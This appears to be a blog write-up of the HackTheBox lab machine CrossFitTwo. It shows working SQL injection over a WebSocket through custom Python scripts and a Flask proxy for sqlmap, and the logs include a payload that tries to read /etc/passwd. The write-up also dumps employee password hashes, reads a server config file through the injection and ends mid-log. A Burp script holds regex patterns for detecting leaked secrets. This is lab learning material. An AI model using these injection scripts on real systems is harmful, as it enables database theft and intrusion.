---
title: CrossFitTwo
date: 2026-09-01
ShowToc: true
draft: false
TocOpen: true
tags:
  - blog
lastmod: 2026-09-18T06:49:14.290Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/CrossFitTwo" >}}

### Port 80 CrossFit

![Pasted image 20260901130156.png](/ob/Pasted%20image%2020260901130156.png)

When I click the member AREA , it will redirect to employees.crossfit.htb\
![Pasted image 20260902145836.png](/ob/Pasted%20image%2020260902145836.png)

So I will add into the /etc/hosts

### FFUF

Let do the suddomain ffuf

```
┌──(root㉿kali)-[/opt/payloads]
└─# ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://crossfit.htb -H 'Host: FUZZ.crossfit.htb' -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://crossfit.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.crossfit.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

:: Progress: [19966/19966] :: Job [1/1] :: 1428 req/sec :: Duration: [0:00:21] :: Errors: 19966 ::

```

### feroxbuster

### Javascript

![Pasted image 20260902151529.png](/ob/Pasted%20image%2020260902151529.png)

`/js/main.js`

* **Why:** Custom application scripts contain client-side business logic, API endpoints, internal routing paths, configuration variables, or unhandled parameters

`/js/ws.min.js`

* **Why:** The `ws` prefix typically indicates **WebSocket** communication logic. Reviewing this file can reveal WebSocket server endpoints, expected payload structures, event names, or authentication mechanisms.

* `/js/bootstrap.min.js`

* `/js/circle-progress.min.js`

* `/js/jquery-3.3.1.min.js`

* `/js/jquery.magnific-popup.min.js`

* `/js/jquery.slicknav.js`

* `/js/owl.carousel.min.js`

**Why:** These are standard, un-modified open-source UI libraries (jQuery, Bootstrap, plugins for sliders/modals). Unless a specific target application uses a known vulnerable third-party version, analyzing standard frontend libraries yields minimal application-specific information compared to custom code.

### /js/ws.min.js

```
HTTP / 1.1 200 OK
Connection: keep - alive
Content - Length: 1455
Content - Type: application / javascript
Date: Wed, 02 Sep 2026 06: 56: 58 GMT
Last - Modified: Mon, 04 Jan 2021 08: 52: 43 GMT
Server: OpenBSD httpd

function updateScroll() {
    var e = document.getElementById("chats");
    e.scrollTop = e.scrollHeight
}
var token, ws = new WebSocket("ws://gym.crossfit.htb/ws/"),
    pingTimeout = setTimeout(() => {
        ws.close(), $(".chat-main").remove()
    }, 31e3);

function check_availability(e) {
    var s = new Object;
    s.message = "available", s.params = String(e), s.token = token, ws.send(JSON.stringify(s))
}
$(".chat-content").slideUp(), $(".hide-chat-box").click(function() {
    $(".chat-content").slideUp()
}), $(".show-chat-box").click(function() {
    $(".chat-content").slideDown(), updateScroll()
}), $(".close-chat-box").click(function() {
    $(".chat-main").remove()
}), ws.onopen = function() {}, ws.onmessage = function(e) {
    "ping" === e.data ? (ws.send("pong"), clearTimeout(pingTimeout)) : (response = JSON.parse(e.data), answer = response.message, answer.startsWith("Hello!") && $("#ws").show(), token = response.token, $("#chat-messages").append('<li class="receive-msg float-left mb-2"><div class="receive-msg-desc float-left ml-2"><p class="msg_display bg-white m-0 pt-1 pb-1 pl-2 pr-2 rounded">' + answer + "</p></div></li>"), updateScroll())
}, $("#sendmsg").on("keypress", function(e) {
    if (13 === e.which) {
        $(this).attr("disabled", "disabled");
        var s = $("#sendmsg").val();
        if ("" !== s) {
            $("#chat-messages").append('<li class="send-msg float-right mb-2"><p class="msg_display pt-1 pb-1 pl-2 pr-2 m-0 rounded">' + s + "</p></li>");
            var t = new Object;
            t.message = s, t.token = token, ws.send(JSON.stringify(t)), $("#sendmsg").val(""), $(this).removeAttr("disabled"), updateScroll()
        }
    }
});
```

seem like using the ws://gym.crossfit.htb/ws/ to send the message out

### Burp Custom Action script (Bambda)

To search for a keyword in the HTTP response using a Burp Custom Action script (Bambda), check if the response body contains your target term and log the result to the output panel or highlight it:

If you are starting from the main interface instead, click the **Custom actions** tab on the far-right panel and select **+ New** and click the From blank .

![Pasted image 20260902153936.png](/ob/Pasted%20image%2020260902153936.png)

Haydon - Keyword & Secret Scanner

```
import burp.api.montoya.core.HighlightColor;

import burp.api.montoya.http.message.HttpRequestResponse;

import burp.api.montoya.http.message.headers.HttpHeader;

import burp.api.montoya.logging.Logging;



import java.util.LinkedHashSet;

import java.util.List;

import java.util.regex.Matcher;

import java.util.regex.Pattern;



/**

 * Passive scanner: flags responses (and request URLs) that look like they

 * leak secrets, tokens, or interesting API/WS endpoints.

 *

 * Usage from your ProxyResponseHandler / ScanCheck:

 *

 *   SecretScanner.scan(requestResponse, api.logging());

 */

public final class SecretScanner {



    private SecretScanner() {}



    // ----------------------------------------------------------------

    // Config

    // ----------------------------------------------------------------



    /** Cap how much of the body we regex-scan, to avoid pathological perf on huge responses. */

    private static final int MAX_SCAN_LENGTH = 500_000; // ~500 KB



    /** How much context to capture around a match for the note/log. */

    private static final int SNIPPET_RADIUS = 25;



    // Low-severity "worth a look" keywords. Word-boundary matched to cut noise

    // (so "key" won't match "keyboard"/"monkey", "api" won't match "capitalize", etc.)

    private static final Pattern KEYWORD_PATTERN = Pattern.compile(

        "\\b(ws|admin|token|api|secret|password|passwd|pwd|key|v1|auth|session|credential)\\b",

        Pattern.CASE_INSENSITIVE

    );



    // High-severity structured patterns: (label, pattern). Order doesn't matter.

    private static final List<NamedPattern> HIGH_SEVERITY_PATTERNS = List.of(

        new NamedPattern("Endpoint/WS",

            Pattern.compile("\\b(wss?://[^\\s\"'<>]+|/api/v[0-9]+[^\\s\"'<>]*|/v[0-9]+/[^\\s\"'<>]*)",

                Pattern.CASE_INSENSITIVE)),



        new NamedPattern("Bearer Token",

            Pattern.compile("\\bbearer\\s+[a-zA-Z0-9\\-._~+/]{10,}=*",

                Pattern.CASE_INSENSITIVE)),



        new NamedPattern("JWT",

            // header.payload.signature, each base64url segment

            Pattern.compile("\\beyJ[a-zA-Z0-9_-]{5,}\\.[a-zA-Z0-9_-]{5,}\\.[a-zA-Z0-9_-]{5,}\\b")),



        new NamedPattern("Generic API Key Assignment",

            Pattern.compile("\\b(api[_-]?key|apikey|access[_-]?token|client[_-]?secret)[\"']?\\s*[:=]\\s*[\"']([a-zA-Z0-9_\\-]{12,})[\"']",

                Pattern.CASE_INSENSITIVE)),



        new NamedPattern("Generic Secret/Password Assignment",

            Pattern.compile("\\b(secret|password|passwd|pwd)[\"']?\\s*[:=]\\s*[\"']([^\"'\\s]{4,})[\"']",

                Pattern.CASE_INSENSITIVE)),



        new NamedPattern("AWS Access Key ID",

            Pattern.compile("\\b(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}\\b")),



        new NamedPattern("AWS Secret Key (heuristic)",

            Pattern.compile("\\b(aws)?_?secret_?(access)?_?key[\"']?\\s*[:=]\\s*[\"']([a-zA-Z0-9/+=]{40})[\"']",

                Pattern.CASE_INSENSITIVE)),



        new NamedPattern("Private Key Block",

            Pattern.compile("-----BEGIN (RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----")),



        new NamedPattern("Slack Token",

            Pattern.compile("\\bxox[baprs]-[0-9a-zA-Z-]{10,}\\b")),



        new NamedPattern("Google API Key",

            Pattern.compile("\\bAIza[0-9A-Za-z\\-_]{35}\\b")),



        new NamedPattern("Stripe Key",

            Pattern.compile("\\b(sk|pk|rk)_(live|test)_[0-9a-zA-Z]{16,}\\b")),



        new NamedPattern("GitHub Token",

            Pattern.compile("\\bgh[pousr]_[A-Za-z0-9]{36,}\\b"))

    );



    // Response headers worth checking in addition to the body (often leak

    // auth material even when the body doesn't).

    private static final String[] INTERESTING_RESPONSE_HEADERS = {

        "authorization", "set-cookie", "x-api-key", "x-auth-token", "x-access-token"

    };



    // ----------------------------------------------------------------

    // Entry point

    // ----------------------------------------------------------------



    public static void scan(HttpRequestResponse requestResponse, Logging logging) {

        if (requestResponse == null || !requestResponse.hasResponse()) {

            return;

        }



        String url = requestResponse.request().url();

        String responseBody = safe(requestResponse.response().bodyToString());

        String scanBody = responseBody.length() > MAX_SCAN_LENGTH

            ? responseBody.substring(0, MAX_SCAN_LENGTH)

            : responseBody;



        LinkedHashSet<String> lowSeverityMatches = new LinkedHashSet<>();

        LinkedHashSet<String> highSeverityMatches = new LinkedHashSet<>();



        // 1. Keyword scan (body)

        Matcher kwMatcher = KEYWORD_PATTERN.matcher(scanBody);

        while (kwMatcher.find()) {

            lowSeverityMatches.add(kwMatcher.group().toLowerCase());

        }



        // 2. Structured high-severity patterns (body)

        for (NamedPattern np : HIGH_SEVERITY_PATTERNS) {

            Matcher m = np.pattern.matcher(scanBody);

            while (m.find()) {

                String snippet = snippet(scanBody, m.start(), m.end());

                highSeverityMatches.add(np.label + ": " + snippet);

            }

        }



        // 3. Header scan (response)

        for (String headerName : INTERESTING_RESPONSE_HEADERS) {

            List<HttpHeader> headers = requestResponse.response().headers();

            for (HttpHeader h : headers) {

                if (h.name().equalsIgnoreCase(headerName)) {

                    highSeverityMatches.add("Header " + h.name() + ": " + truncate(h.value(), 60));

                }

            }

        }



        if (lowSeverityMatches.isEmpty() && highSeverityMatches.isEmpty()) {

            return;

        }



        applyAnnotationsAndLog(requestResponse, logging, url, lowSeverityMatches, highSeverityMatches);

    }



    // ----------------------------------------------------------------

    // Internals

    // ----------------------------------------------------------------



    private static void applyAnnotationsAndLog(

            HttpRequestResponse requestResponse,

            Logging logging,

            String url,

            LinkedHashSet<String> lowSeverityMatches,

            LinkedHashSet<String> highSeverityMatches) {



        boolean highSeverityFound = !highSeverityMatches.isEmpty();



        StringBuilder note = new StringBuilder();

        if (highSeverityFound) {

            note.append("CRITICAL: ").append(String.join(" | ", highSeverityMatches));

            if (!lowSeverityMatches.isEmpty()) {

                note.append("  [also: ").append(String.join(", ", lowSeverityMatches)).append("]");

            }

        } else {

            note.append("Matches: ").append(String.join(", ", lowSeverityMatches));

        }



        logging.logToOutput("[+] " + (highSeverityFound ? "CRITICAL" : "match") + " on " + url

            + " -> " + note);



        requestResponse.annotations().setHighlightColor(

            highSeverityFound ? HighlightColor.RED : HighlightColor.YELLOW

        );

        requestResponse.annotations().setNotes(truncate(note.toString(), 500));

    }



    private static String snippet(String body, int start, int end) {

        int from = Math.max(0, start - SNIPPET_RADIUS);

        int to = Math.min(body.length(), end + SNIPPET_RADIUS);

        String raw = body.substring(from, to).replaceAll("\\s+", " ").trim();

        return truncate(raw, 80);

    }



    private static String truncate(String s, int max) {

        if (s == null) return "";

        return s.length() <= max ? s : s.substring(0, max) + "...";

    }



    private static String safe(String s) {

        return s == null ? "" : s;

    }



    private static final class NamedPattern {

        final String label;

        final Pattern pattern;



        NamedPattern(String label, Pattern pattern) {

            this.label = label;

            this.pattern = pattern;

        }

    }

}
```

Detected the ws ,

![Pasted image 20260902155204.png](/ob/Pasted%20image%2020260902155204.png)

### WS

I will add the gym.crossfit.htb into the /etc/hosts

![Pasted image 20260902160020.png](/ob/Pasted%20image%2020260902160020.png)

after add into the /etc/hosts , and refresh homepage , it show the chatbot

![Pasted image 20260902160634.png](/ob/Pasted%20image%2020260902160634.png)

and in the websockets history found the ws

![Pasted image 20260902160747.png](/ob/Pasted%20image%2020260902160747.png)

But it like to have the time limit , so I have to try to reconnect in the burpsuite

![Pasted image 20260902161553.png](/ob/Pasted%20image%2020260902161553.png)

they will update the token , but how can I get the token  ?

### Token

When I refresh the home page

1. get /ws/
2. response say need to Switch Protocols
3. the chatroom has the time limit

So need to select the Direction to `To server` and send to repeater\
![Pasted image 20260902163944.png](/ob/Pasted%20image%2020260902163944.png)

After the reconnect , and send in the History will return the token , and you need to replace the token in the websocket and send

![Pasted image 20260902164230.png](/ob/Pasted%20image%2020260902164230.png)

So the flow is in the response to take the token and replace webSocket message 's token

Let do with python

### Exploit.py with direct interactive

```
┌──(root㉿kali)-[~/Desktop/HTB/CrossFitTwo]
└─# python3 -m websockets ws://gym.crossfit.htb/ws
Connected to ws://gym.crossfit.htb/ws.
< {"status":"200","message":"Hello! This is Arnold, your assistant. Type 'help' to see available commands.","token":"7eb7f4839f4341699be6a3ca9d7946c001d72f1130b43298e11b14898916e8e9"}
> {"message":"help","token":"7eb7f4839f4341699be6a3ca9d7946c001d72f1130b43298e11b14898916e8e9"}
< {"status":"200","message":"Available commands:<br>- coaches<br>- classes<br>- memberships","token":"6a4a7aaf970d3a27b86fd7721036faf5fc4e13d9438bc5d49546c92fc2102009"}
> {"message":"available","params":"3", "token": "6a4a7aaf970d3a27b86fd7721036faf5fc4e13d9438bc5d49546c92fc2102009"}
< {"status":"200","message":"I'm sorry, this membership plan is currently unavailable.","token":"b91725f01d0b29eae0d036a105f3b8faf086cda8bcd62a88c18a92c0f48b7156","debug":"[id: 3]"}
> 
```

### SQL

3 is confirmed existed ,and limit 1 is the logic for only show 1 result

```
> {"message":"available","params":"3 or 1=1 limit 1", "token": "31296c13f9bbd58009183568f2d09e823cf4eacbb58176701567088fac697a24"}
< {"status":"200","message":"Good news! This membership plan is available.","token":"1e0f946728f079a783abe20d77e2e62679f1c06310cc64e21a77f808e7aef8dd","debug":"[id: 1, name: 1-month]"}
```

### Union Injection

NULL-- return `i m sorry ` , NULL,NULL-- return `good news`

```
> {"message":"available","params":"3 UNION SELECT NULL--", "token": "2dea7a0386d48c7a8e8b14b60639df258c96ee4f5589c897e74f71057a0b240a"}
< {"status":"200","message":"I'm sorry, this membership plan is currently unavailable.","token":"0776b2c90a3a50ae799d1bbd365baee7ef0e6529f478b5e9089acc90c1b54638","debug":"[id: 3 UNION SELECT NULL--]"}
> {"message":"available","params":"3 UNION SELECT NULL,NULL--", "token": "0776b2c90a3a50ae799d1bbd365baee7ef0e6529f478b5e9089acc90c1b54638"}
< {"status":"200","message":"Good news! This membership plan is available.","token":"afabdda076002f952a806ffa7dda7b92d1a9dd02cdb03633aaa33749f7e40d18","debug":"[id: null, name: null]"}

```

### take the token in ws by python

```
┌──(root㉿kali)-[~/Desktop/HTB/CrossFitTwo]
└─# python ws_token.py  
30a841996073b29a507a8a5979fccdc88140bc3f3c3ccffe11a6853420c17c6b
```

code

```
import json
import websocket 


ws = websocket.create_connection("ws://gym.crossfit.htb/ws/")
data = json.loads(ws.recv())
token = data['token']
print(token)

```

### interactive by sys

```
┌──(root㉿kali)-[~/Desktop/HTB/CrossFitTwo]
└─# python ws_token.py  2
940019dbbc8312f8809d139fd4f172402cdecddd5299b9a167e551292c6a81c3
[id: 2, name: 3-months]
                         
```

```
┌──(root㉿kali)-[~/Desktop/HTB/CrossFitTwo]
└─# python ws_token.py  '3 union select 1,2'
bdf5779fbb4303896a034243c975fe706498b4ea50be241076313961e546b01d
[id: 1, name: 2]

```

wrote by mine

```
import json
import websocket
import sys

prompt = "injection> "


def get_token():
    ws = websocket.create_connection("ws://gym.crossfit.htb/ws/")
    data = json.loads(ws.recv())
    return ws, data["token"]


def talk(ws,word, token):
    ws.send(f'{{"message":"available","params":"{word}", "token": "{token}"}}')
    data1 = json.loads(ws.recv())
    print(data1["debug"])


def main():
    ws, token_str = get_token()
    print(token_str)
    talk(ws, sys.argv[1] ,token_str)


if __name__ == "__main__":
    main()
```

### SQL inject

```
┌──(root㉿kali)-[~/Desktop/HTB/CrossFitTwo]
└─# python ws_token.py  
[+] Token: 03efd5d964a6e36f886dff8a425e488035f100a8757989f0771bc1c2f537a188

injection> 3 union select 1,2
[id: 1, name: 2]
```

```
┌──(root㉿kali)-[~/Desktop/HTB/CrossFitTwo]
└─# python ws_token.py  
[+] Token: befc7b5c21b83193c8755c27aeddbaf8c27028dacdb7cba31918f1449f82324f

injection> 3 union select group_concat(schema_name),2 from information_schema.schemata
[id: information_schema,crossfit,employees, name: 2]

```

### Script SQL

I could take this further by adding commands. For example, with a little refactoring, I’ll add two commands that will list the databases and the tables within a database:

```
#!/usr/bin/env python3

import json
import websocket
from cmd import Cmd


class Term(Cmd):
    prompt = "injection> "

    def __init__(self):
        self.connect()
        super().__init__()

    def connect(self):
        self.ws = websocket.create_connection("ws://gym.crossfit.htb/ws/")
        data = json.loads(self.ws.recv())
        self.token = data["token"]

    def send_ws(self, params):
        self.ws.send(
            f'{{"message":"available","params":"{params}", "token": "{self.token}"}}'
        )
        data = json.loads(self.ws.recv())
        self.token = data["token"]
        return data["debug"]

    def send_connected(self, params):
        try:
            return self.send_ws(params)
        except websocket._exceptions.WebSocketConnectionClosedException:
            self.connect()
            return self.send_ws(params)

    def default(self, args):
        print(self.send_connected(args))

    def do_dbs(self, args):
        results = self.send_connected(
            "3 union select group_concat(schema_name),2 from information_schema.schemata"
        )
        print("\n".join(results.split(", ")[0].split()[1].split(",")))

    def do_tables(self, args):
        if len(args) == 0:
            print("[-] database name required. run dbs command to list databases.")
            return
        results = self.send_connected(
            f"3 union select group_concat(table_name), 2 from information_schema.tables where table_schema='{args}'"
        )
        print("\n".join(results.split(", ")[0].split()[1].split(",")))

    def do_exit(self, args):
        return True


term = Term()
term.cmdloop()

```

```
┌──(root㉿kali)-[~/Desktop/HTB/CrossFitTwo]
└─# python sql.py       
injection> help 

Documented commands (type help <topic>):
========================================
help

Undocumented commands:
======================
dbs  exit  tables

injection> dbs
information_schema
crossfit
employees

```

### Target set in 127.0.0.1:5000 and do the sql map

```
#!/usr/bin/env python3

import json
import signal
import websocket
from flask import *


app = Flask(__name__)


@app.route("/")
def index():
    ws = websocket.create_connection('ws://gym.crossfit.htb/ws/')
    data = ws.recv()
    token = json.loads(data)['token']
    params = request.args['params']
    ws.send(f'{{"message":"available","params":"{params}", "token": "{token}"}}')
    data = ws.recv()
    return json.loads(data)['debug']


if __name__ == "__main__":
    app.run(debug=True)
```

```
┌──(root㉿kali)-[~/Desktop/HTB/CrossFitTwo]
└─# python sql_proxy.py 
 * Serving Flask app 'sql_proxy'
 * Debug mode: on
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://127.0.0.1:5000
Press CTRL+C to quit
 * Restarting with watchdog (inotify)
 * Debugger is active!
 * Debugger PIN: 140-331-902
127.0.0.1 - - [18/Sep/2026 02:22:02] "GET /?params=1 HTTP/1.1" 200 -
127.0.0.1 - - [18/Sep/2026 02:22:03] "GET /?params=1&QpNq=8486%20AND%201%3D1%20UNION%20ALL%20SELECT%201,NULL,'<script>alert("XSS")</script>',table_name%20FROM%20information_schema.tables%20WHERE%202>1--/**/;%20EXEC%20xp_cmdshell('cat%20../../../etc/passwd')%23 HTTP/1.1" 200 -
127.0.0.1 - - [18/Sep/2026 02:22:03] "GET /?params=1 HTTP/1.1" 200 -
127.0.0.1 - - [18/Sep/2026 02:22:10] "GET /?params=1)%20ORDER%20BY%201--%20yCHs HTTP/1.1" 200 -
127.0.0.1 - - [18/Sep/2026 02:22:11] "GET /?params=1)%

. . . snip . . .
```

```
┌──(root㉿kali)-[~/Desktop/HTB/CrossFitTwo]
└─# sqlmap -u http://127.0.0.1:5000/?params=1 --timeout 1 --ignore-timeouts --technique=U -p params --batch --tables
        ___
       __H__                                                                                                        
 ___ ___[.]_____ ___ ___  {1.10.8#stable}                                                                           
|_ -| . [,]     | .'| . |                                                                                           
|___|_  [)]_|_|_|__,|  _|                                                                                           
      |_|V...       |_|   https://sqlmap.org                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:23:42 /2026-09-18/

[02:23:42] [WARNING] the minimum HTTP timeout is 3 seconds, sqlmap will going to reset it
[02:23:42] [INFO] resuming back-end DBMS 'mysql' 
[02:23:42] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: params (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: params=-4379 UNION ALL SELECT CONCAT(CONCAT('qkzpq','nKzbAvAyUDOcqpqfWJqNvDtWkksFWypuznNleyvd'),'qkjjq'),NULL-- CXyS
---
[02:23:43] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL 5 (MariaDB fork)
[02:23:43] [INFO] fetching database names
[02:23:43] [INFO] fetching tables for databases: 'crossfit, employees, information_schema'
[02:23:44] [WARNING] reflective value(s) found and filtering out
Database: information_schema
[79 tables]
+---------------------------------------+
| ALL_PLUGINS                           |
| APPLICABLE_ROLES                      |
| CHARACTER_SETS                        |
| CHECK_CONSTRAINTS                     |
| CLIENT_STATISTICS                     |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMN_PRIVILEGES                     |
| ENABLED_ROLES                         |
| FILES                                 |
| GEOMETRY_COLUMNS                      |
| GLOBAL_STATUS                         |
| GLOBAL_VARIABLES                      |
| INDEX_STATISTICS                      |
| INNODB_BUFFER_PAGE                    |
| INNODB_BUFFER_PAGE_LRU                |
| INNODB_BUFFER_POOL_STATS              |
| INNODB_CMP                            |
| INNODB_CMPMEM                         |
| INNODB_CMPMEM_RESET                   |
| INNODB_CMP_PER_INDEX                  |
| INNODB_CMP_PER_INDEX_RESET            |
| INNODB_CMP_RESET                      |
| INNODB_FT_BEING_DELETED               |
| INNODB_FT_CONFIG                      |
| INNODB_FT_DEFAULT_STOPWORD            |
| INNODB_FT_DELETED                     |
| INNODB_FT_INDEX_CACHE                 |
| INNODB_FT_INDEX_TABLE                 |
| INNODB_LOCKS                          |
| INNODB_LOCK_WAITS                     |
| INNODB_METRICS                        |
| INNODB_SYS_COLUMNS                    |
| INNODB_SYS_FIELDS                     |
| INNODB_SYS_FOREIGN                    |
| INNODB_SYS_FOREIGN_COLS               |
| INNODB_SYS_INDEXES                    |
| INNODB_SYS_TABLES                     |
| INNODB_SYS_TABLESPACES                |
| INNODB_SYS_TABLESTATS                 |
| INNODB_SYS_VIRTUAL                    |
| INNODB_TABLESPACES_ENCRYPTION         |
| INNODB_TRX                            |
| KEYWORDS                              |
| KEY_CACHES                            |
| KEY_COLUMN_USAGE                      |
| OPTIMIZER_TRACE                       |
| PARAMETERS                            |
| PROFILING                             |
| REFERENTIAL_CONSTRAINTS               |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMA_PRIVILEGES                     |
| SESSION_STATUS                        |
| SESSION_VARIABLES                     |
| SPATIAL_REF_SYS                       |
| SQL_FUNCTIONS                         |
| STATISTICS                            |
| SYSTEM_VARIABLES                      |
| TABLESPACES                           |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| TABLE_STATISTICS                      |
| THREAD_POOL_GROUPS                    |
| THREAD_POOL_QUEUES                    |
| THREAD_POOL_STATS                     |
| THREAD_POOL_WAITS                     |
| USER_PRIVILEGES                       |
| USER_STATISTICS                       |
| VIEWS                                 |
| COLUMNS                               |
| ENGINES                               |
| EVENTS                                |
| PARTITIONS                            |
| PLUGINS                               |
| PROCESSLIST                           |
| TABLES                                |
| TRIGGERS                              |
| user_variables                        |
+---------------------------------------+

Database: crossfit
[1 table]
+---------------------------------------+
| membership_plans                      |
+---------------------------------------+

Database: employees
[2 tables]
+---------------------------------------+
| employees                             |
| password_reset                        |
+---------------------------------------+

[02:23:44] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/127.0.0.1'

[*] ending @ 02:23:44 /2026-09-18/

```

Switching to the `employees` database, the `employees` table has four entries (`-D employees -T employees --dump`):

```
Database: employees
Table: employees
[4 entries]
+----+-----------------------------+------------------------------------------------------------------+---------------+
| id | email                       | password                                                         | username      |
+----+-----------------------------+------------------------------------------------------------------+---------------+
| 1  | david.palmer@crossfit.htb   | fff34363f4d15e958f0fb9a7c2e7cc550a5672321d54b5712cd6e4fa17cd2ac8 | administrator |
| 2  | will.smith@crossfit.htb     | 06b4daca29092671e44ef8fad8ee38783b4294d9305853027d1b48029eac0683 | wsmith        |
| 3  | maria.williams@crossfit.htb | fe46198cb29909e5dd9f61af986ca8d6b4b875337261bdaa5204f29582462a9c | mwilliams     |
| 4  | jack.parker@crossfit.htb    | 4de9923aba6554d148dbcd3369ff7c6e71841286e5106a69e250f779770b3648 | jparker       |
```

```
injection> read /etc/relayd.conf
table<1>{127.0.0.1}
table<2>{127.0.0.1}
table<3>{127.0.0.1}
table<4>{127.0.0.1}
http protocol web{
        pass request quick header "Host" value "*crossfit-club.htb" forward to <3>
        pass request quick header "Host" value "*employees.crossfit.htb" forward to <2>
        match request path "/*" forward to <1>
        match request path "/ws*" forward to <4>
        http websockets
}

table<5>{127.0.0.1}
table<6>{127.0.0.1 127.0.0.2 127.0.0.3 127.0.0.4}
http protocol portal{
        pass request quick path "/" forward to <5>
        pass request quick path "/index.html" forward to <5>
        pass request quick path "/home" forward to <5>
        pass request quick path "/login" forward to <5>
        pass request quick path "/chat" forward to <5>
        pass request quick path "/js/*" forward to <5>
        pass request quick path "/css/*" forward to <5>
        pass request quick path "/fonts/*" forward to <5>
        pass request quick path "/images/*" forward to <5>
        pass request quick path "/favicon.ico" forward to <5>
        pass forward to <6>
        http websockets
}

relay web{
        listen on "0.0.0.0" port 80
        protocol web
        forward to <1> port 8000
        forward to <2> port 8001
        forward to <3> port 9999
        forward to <4> port 4419
}

relay portal{
        listen on 127.0.0.1 port 9999
        protocol portal
        forward to <5> port 8002
        forward to <6> port 5000 mode source-hash
}
```

### crossfit-club.htb

### Javascript inspect

![Pasted image 20260918143524.png](/ob/Pasted%20image%2020260918143524.png)

There’s a ton starting with `chunk-vendors~`, but also one that starts with `app~`. Using `curl`, `grep`, and `sort` I’ll isolate unique references to `/api`:

![Pasted image 20260918143836.png](/ob/Pasted%20image%2020260918143836.png)

### Javascript findings

```
┌──(root㉿kali)-[~/Desktop/HTB/CrossFitTwo]
└─# curl http://crossfit-club.htb/js/app~748942c6.ead68abe.js | grep -oE '/api/[^"]*' | sort -u
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100  15458 100  15458   0      0  18482      0                              0
/api/auth
/api/gridy/${e[t].username}.svg`,new:!1,unreadCount:0,roomName:e[t].username,users:[]};a.users.push(this.getCurrentUser()),a.users.push(e[t]),this.rooms.push(a)}},sendGlobal:function(e,t){const a={sender_id:xe.id,content:e,roomId:t};xe.emit(
/api/gridy/${name}.svg`,items:[{title:
/api/login

```

Throwing the JavaScript into [beautifier.io](https://beautifier.io) shows where these are used. The two for `/api/gridy` are to another site. The other two are interesting. `/api/auth`:

The code is still obscure, but there are both GET and POST requests, as well as data for the POST to `/api/login`.

```
je.beforeEach(async (e, t, a) => {
			"/login" === e.path ? (await Y.a.get("/api/auth", {
						withCredentials: !0
					})
					.then(e => {
						const t = e.data;
						localStorage.setItem("_csrf", t.token), "true" === t.success && a("/")
					})
					.catch(e => {
						console.log(e), a("/login")
					}), a()) : await Y.a.get("/api/auth", {
					withCredentials: !0
				})
				.then(e => {
					const t = e.data;
					localStorage.setItem("_csrf", t.token), "true" === t.success ? (localStorage.setItem("user", t.username), a()) : a("/login")
				})
				.catch(e => {
					console.log(e), a("/login")
				})
		});
```

```
┌──(root㉿kali)-[~/Desktop/HTB/CrossFitTwo]
└─# curl -s crossfit-club.htb/api/auth
{"success":"false","token":"uqAVbmpY-waVdStHvMSF0YYsAV-b-HTzH1Ss"}   
```

### api end point discover

```
wfuzz -X POST -u http://crossfit-club.htb/api/FUZZ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hc 404
```

```
──(root㉿kali)-[~/Desktop/HTB/CrossFitTwo]
└─# wfuzz -X POST -u http://crossfit-club.htb/api/FUZZ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hc 404
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
default
default
 /usr/lib/python3/dist-packages/wfuzz/plugin_api/base.py:60: SyntaxWarning:'return' in a 'finally' block
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://crossfit-club.htb/api/FUZZ
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload        
=====================================================================

000000110:   200        0 L      3 W        50 Ch       "login"        
000000768:   200        0 L      3 W        50 Ch       "signup"       

```

`signup` is what I was looking for. A POST request without data returns:

```
┌──(root㉿kali)-[~/Desktop/HTB/CrossFitTwo]
└─# curl -s -X POST crossfit-club.htb/api/signup
{"success":"false","message":"Invalid CSRF Token"}     
```

When I observed the POST to `/api/login` above, the CSRF token was passed in the `X-CSRF-TOKEN` header, which can be fetched from `/api/auth`. I could also verify that with an OPTIONS request that shows it accepts a `X-CSRF-TOKEN` header:

```
┌──(root㉿kali)-[~/Desktop/HTB/CrossFitTwo]
└─#  curl -v -X OPTIONS crossfit-club.htb/api/signup
* Host crossfit-club.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.87.222
*   Trying 10.129.87.222:80...
* Established connection to crossfit-club.htb (10.129.87.222 port 80) from 10.10.15.206 port 53178 
* using HTTP/1.x
> OPTIONS /api/signup HTTP/1.1
> Host: crossfit-club.htb
> User-Agent: curl/8.21.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 204 No Content
< Access-Control-Allow-Credentials: true
